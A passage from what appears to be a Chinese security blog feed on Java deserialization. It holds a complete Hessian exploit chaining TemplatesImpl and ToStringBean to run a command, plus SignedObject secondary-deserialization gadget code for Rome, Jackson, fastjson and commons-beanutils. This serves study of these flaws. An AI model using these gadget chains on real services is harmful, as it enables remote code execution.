class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ser;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javafx.beans.property.Property;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">hessian_tostring</span> &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br><br><br><span class="hljs-comment">//        UIDefaults uiDefaults = new UIDefaults();</span><br><span class="hljs-comment">//        uiDefaults.put(&quot;aaa&quot;, new SwingLazyValue(&quot;javax.naming.InitialContext&quot;, &quot;doLookup&quot;, new Object[]&#123;&quot;rmi://127.0.0.1:1099/remoteExploit8&quot;&#125;));</span><br><span class="hljs-comment">//        Class&lt;?&gt; aClass = Class.forName(&quot;javax.swing.MultiUIDefaults&quot;);</span><br><span class="hljs-comment">//        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(UIDefaults[].class);</span><br><span class="hljs-comment">//        declaredConstructor.setAccessible(true);</span><br><span class="hljs-comment">//        Object o = declaredConstructor.newInstance(new Object[]&#123;new UIDefaults[]&#123;uiDefaults&#125;&#125;);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        EqualsBean equalsBean = new EqualsBean(Object.class,o);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="hljs-comment">//        hashMap.put(equalsBean,&quot;2&quot;);</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class));<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;Cat&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open  -a calculator\&quot;);&quot;</span>;<br>        cc.makeClassInitializer().insertBefore(cmd);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">randomClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;EvilCat&quot;</span>;<br>        cc.setName(randomClassName);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br><br>        <span class="hljs-type">byte</span>[] classBytes = cc.toBytecode();<br>        <span class="hljs-type">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;classBytes&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);<br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class, templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,toStringBean);<br><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br>        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>        <span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>        signature.initSign(privateKey);<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(badAttributeValueExpException, privateKey,signature );<br><br><br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">equalsBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(SignedObject.class,signedObject));<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(equalsBean,<span class="hljs-string">&quot;2&quot;</span>);<br><br><br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./hessiantwo&quot;</span>));<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(hashMap);<br>        hessian2Output.flushBuffer();<br><br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./hessiantwo&quot;</span>));<br>        hessian2Input.readObject();<br><br><span class="hljs-comment">//        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="hljs-comment">//        ObjectOutputStream outputStream = new ObjectOutputStream(baos);</span><br><span class="hljs-comment">//        outputStream.writeObject(hashMap);</span><br><span class="hljs-comment">//        outputStream.close();</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="hljs-comment">//        ObjectInputStream Input = new ObjectInputStream(bais);</span><br><span class="hljs-comment">//        Input.readObject();</span><br><span class="hljs-comment">//        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./hessian_tostring&quot;));</span><br><span class="hljs-comment">//        outputStream.writeObject(hashMap);</span><br><span class="hljs-comment">//        outputStream.close();</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./hessian_tostring&quot;));</span><br><span class="hljs-comment">//        inputStream.readObject();</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ul><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p><a href="https://blog.wanghw.cn/security/hessian-deserialization-jdk-rce-gadget.html">https://blog.wanghw.cn/security/hessian-deserialization-jdk-rce-gadget.html</a></p><p><a href="https://goodapple.top/archives/1193">https://goodapple.top/archives/1193</a></p><p><a href="https://www.cnblogs.com/LittleHann/p/17818994.html">https://www.cnblogs.com/LittleHann/p/17818994.html</a></p><p><a href="https://www.cnblogs.com/kingbridge/articles/16717030.html">https://www.cnblogs.com/kingbridge/articles/16717030.html</a></p><p><a href="https://su18.org/post/hessian/">https://su18.org/post/hessian/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二次反序列化学习（一）</title>
    <link href="/2024/01/17/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/01/17/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="二次反序列化学习（一）"><a href="#二次反序列化学习（一）" class="headerlink" title="二次反序列化学习（一）"></a>二次反序列化学习（一）</h2><p>为了更好找到银行驻场，随学习二次反序列化。</p><p><img src="v2-e88049215a67c7ab818b07354e26e58a_xl.jpg" alt="img"></p><h2 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h2><h3 id="0x01-SignedObject分析"><a href="#0x01-SignedObject分析" class="headerlink" title="0x01 SignedObject分析"></a>0x01 SignedObject分析</h3><p>比较简单。可以序列化，fied可控。太完美了，早入行几年就好了。</p><p>java&#x2F;security&#x2F;SignedObject.java#getObject()</p><p><img src="image-20240117020703509.png" alt="image-20240117020703509"></p><p><img src="image-20240117020654623.png" alt="image-20240117020654623"></p><p>可以看到这个从content获取流然后进行反序列化。</p><p><img src="image-20240117020950838.png" alt="image-20240117020950838"></p><p>content是一个byte数组。继承ser。那么无非就是反射赋值，或者构造函数赋值。</p><p><img src="image-20240117021123904.png" alt="image-20240117021123904"></p><p>构造函数pubilc，直接new就完事了，然后触发getObject()就行。很容易想到jackson，fastjson，cb等来触发javabean的getter来进行触发。</p><p>java&#x2F;security&#x2F;Signature.java#Map()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> Map&lt;String,Boolean&gt; signatureInfo;<br><br><span class="hljs-keyword">static</span> &#123;<br>    signatureInfo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;String,Boolean&gt;();<br>    <span class="hljs-type">Boolean</span> <span class="hljs-variable">TRUE</span> <span class="hljs-operator">=</span> Boolean.TRUE;<br>    <span class="hljs-comment">// pre-initialize with values for our SignatureSpi implementations</span><br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.provider.DSA$RawDSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.provider.DSA$SHA1withDSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.rsa.RSASignature$MD2withRSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.rsa.RSASignature$MD5withRSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.rsa.RSASignature$SHA1withRSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.rsa.RSASignature$SHA256withRSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.rsa.RSASignature$SHA384withRSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.rsa.RSASignature$SHA512withRSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;com.sun.net.ssl.internal.ssl.RSASignature&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.pkcs11.P11Signature&quot;</span>, TRUE);<br>&#125;<br></code></pre></td></tr></table></figure><p>jdk自带算法</p><p>根据自带算法，构造Signature的构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br><span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br><span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br><span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>signature.initSign(privateKey);<br><span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(templates, privateKey,signature );<br></code></pre></td></tr></table></figure><h3 id="0x02-多种方法触发SignedObject-getObject"><a href="#0x02-多种方法触发SignedObject-getObject" class="headerlink" title="0x02 多种方法触发SignedObject.getObject()"></a>0x02 多种方法触发SignedObject.getObject()</h3><h4 id="一、依赖-hashmap-Rome"><a href="#一、依赖-hashmap-Rome" class="headerlink" title="一、依赖: hashmap-&gt;Rome"></a>一、依赖: hashmap-&gt;Rome</h4><p>因为调用SignedObject.getObject()。所以需要gettset来触发。有很多方法。</p><p>hashmap.readObject()-&gt;hash(key)-&gt;key.hashcode-&gt;Rome.ObjectBean.hashcode()-&gt;EqualsBean.javabeanHashCode()-&gt;ToStringBean.java#toString()-&gt;SignedObject.getObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br><span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br><span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br><span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>signature.initSign(privateKey);<br><span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(SerObj, privateKey,signature );<br><br><span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(SignedObject.class, signedObject);<br><span class="hljs-type">ObjectBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ToStringBean.class, toStringBean);<br><br>HashMap&lt;Object, Object&gt; hashMap1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>hashMap1.put(root,<span class="hljs-string">&quot;x&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="二、依赖-BadAttributeValueExpException-Rome"><a href="#二、依赖-BadAttributeValueExpException-Rome" class="headerlink" title="二、依赖: BadAttributeValueExpException-&gt;Rome"></a>二、依赖: BadAttributeValueExpException-&gt;Rome</h4><p>BadAttributeValueExpException.readObject()-&gt;ToStringBean.java#toString()-&gt;SignedObject.getObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br><span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br><span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br><span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>signature.initSign(privateKey);<br><span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(SerObj, privateKey,signature );<br><br><span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(SignedObject.class, signedObject);<br><span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>setFieldValue(val1, <span class="hljs-string">&quot;val&quot;</span>, toStringBean);<br></code></pre></td></tr></table></figure><h4 id="三、依赖：jackson"><a href="#三、依赖：jackson" class="headerlink" title="三、依赖：jackson"></a>三、依赖：jackson</h4><p>BadAttributeValueExpException.readObject()-&gt;jackson.databind.node.POJONode.toString()-&gt;om.fasterxml.jackson.databind.node.toString()-&gt;com.fasterxml.jackson.databind.ObjectWriter.writeValueAsString()-&gt;SignedObject.getObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-comment">// 保证能写入序列化数据，利用javassist删除writeReplace()。</span><br><span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool_1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool_1.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        jsonNode.removeMethod(writeReplace);<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>        jsonNode.toClass(classLoader, <span class="hljs-literal">null</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    &#125;<br>    <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br>    <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br>    <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>    <span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>    signature.initSign(privateKey);<br>    <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(hashMap, privateKey,signature );<br><br>    <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>    <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>    setFieldValue(val1, <span class="hljs-string">&quot;val&quot;</span>, jsonNodes1);<br></code></pre></td></tr></table></figure><h4 id="四、依赖：fastjson-1-2-48"><a href="#四、依赖：fastjson-1-2-48" class="headerlink" title="四、依赖：fastjson 1.2.48+"></a>四、依赖：fastjson 1.2.48+</h4><p>HashMap.readObject()-&gt;BadAttributeValueExpException.readObject()-&gt;BadAttributeValueExpException.toString()-&gt;<strong>com.alibaba.fastjson.JSONObject.toString()&#x2F;com.alibaba.fastjson.JSONArray.toString()</strong>-&gt;com.alibaba.fastjson.JSON.toString()-&gt;com.alibaba.fastjson.JSON.toJSONString()-&gt;com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;JSONSerializer.java#write()-&gt;com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;ASMSerializerFactory.javacreateJavaBeanSerializer(SerializeBeanInfo beanInfo) -&gt;SignedObject.getObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br>        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>        <span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>        signature.initSign(privateKey);<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(SerObj, privateKey,signature );<br>        <br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;222&quot;</span>,signedObject);<br><span class="hljs-comment">//        JSONArray objects = new JSONArray();</span><br><span class="hljs-comment">//        objects.add(signedObject);</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val1, <span class="hljs-string">&quot;val&quot;</span>, jsonObject);<br><br>        HashMap&lt;Object, Object&gt; hashMap1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap1.put(signedObject,val1);<br></code></pre></td></tr></table></figure><h4 id="五、依赖：cb"><a href="#五、依赖：cb" class="headerlink" title="五、依赖：cb"></a>五、依赖：cb</h4><p>PriorityQueue.readObect()-&gt; org.apache.commons.beanutils.BeanComparator.compare()-&gt;PropertyUtils.getProperty()-&gt;SignedObject.getObject()-&gt;PropertyUtilsBean.java#getSimpleProperty()-&gt;SignedObject.getObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td 